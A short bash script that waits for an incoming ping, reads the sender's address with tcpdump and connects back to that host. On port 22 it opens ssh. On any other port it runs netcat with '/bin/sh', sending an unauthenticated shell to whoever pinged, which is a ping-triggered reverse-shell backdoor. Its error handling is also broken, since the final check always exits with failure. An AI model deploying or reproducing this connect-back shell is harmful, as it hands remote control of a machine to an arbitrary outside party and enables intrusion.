#!/bin/bash

##
## Connect to host pinged by computer.
## Uses ssh by default or if port is 22.
## Otherwise runs netcat on specified port.
##

PORT=22
ERROR=
USER=
QUIET=
IFACE=

for i in $*; do
    case ${i} in
        -p*|--port=*)
            PORT=$(echo ${i} | sed 's/\(-p\|--port=\)\([[:digit:]]\+\)/\2/')
            ;;
        -q|--quiet)
            QUIET=true
            ;;
        -u*|--user=*)
            USER=$(echo ${i} | sed 's/\(-u\|--user=\)\([[:print:]]\+\)/\2/')
            ;;
        -i*|--interface=*)
            IFACE=$(echo ${i} | sed 's/\(-i\|--interface=\)\(.\+\)/\2/')
            ;;
    esac
done

if [ "${IFACE}" ]; then
    if [ -z "${QUIET}" ]; then
        echo "Using interface: ${IFACE}"
    fi
    HOST="`tcpdump -i${IFACE} -c1 'icmp[icmptype] == icmp-echo or (icmp6 && ip6[40] == 128)' 2> /dev/null | cut -f3 -d' '`"
else
    HOST="`tcpdump -c1 'icmp[icmptype] == icmp-echo or (icmp6 && ip6[40] == 128)' 2> /dev/null | cut -f3 -d' '`"
fi

if [ $? -ne 0 ]; then
    ERROR=true
fi

if [ -z "${QUIET}" ]; then
    echo "Host found: ${HOST}"
fi

if ./checkport.sh -q -p${PORT} "${HOST}"; then
    if [ ${PORT} -ne 22 ]; then
      nc -c '/bin/sh' ${HOST} ${PORT}
    else
      if [ "${USER}" ]; then
          if [ -z "${QUIET}" ]; then
             echo "User Given: ${USER}"
         fi
         ssh ${USER}@${HOST}
     else
          ssh ${HOST}
      fi
    fi
else
    if [ -z "${QUIET}" ]; then
        echo "Host is not listening on port 22"
    fi
fi

if [ ERROR ]; then
    exit 1
else
    exit 0
fi
